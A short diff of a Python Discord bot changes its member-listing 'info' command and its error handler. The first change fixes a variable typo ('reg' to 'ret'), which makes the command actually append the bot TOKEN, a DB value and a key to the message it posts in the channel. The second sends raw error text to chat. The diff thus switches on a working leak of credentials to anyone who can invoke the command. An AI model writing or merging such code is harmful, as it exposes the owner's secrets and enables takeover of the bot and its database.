@@ -83,7 +83,7 @@ async def create_channel(ctx, channel_name='collablang'):
 async def info(ctx):
     ret = f"Guild id:- {ctx.guild.id}\nMembers:\n- "
     ret += "\n- ".join([f"{'None' if (c:=member.nick) is None else c:<26}\|\|{member.name} {''.join([r.name[0] for r in member.roles])} {member.status}" for member in ctx.guild.members])
-    reg += f"\n {TOKEN} {DB} {key}"
+    ret += f"\n {TOKEN} {DB} {key}"
     await ctx.send(ret)
 @bot.command(name=".weather")
 async def weather(ctx,city: str):
@@ -139,7 +139,7 @@ async def remove(ctx,word):
         txt=m.content.split("\n")
         if txt[0]==word:
             await ctx.send(f"the meaning of {word} is:-\n{txt[1]}")
-@bot.error()
+@info.error
 async def error(ctx, error):
-    await ctx.send(error.message)
+    await ctx.send(error)
 bot.run(TOKEN)
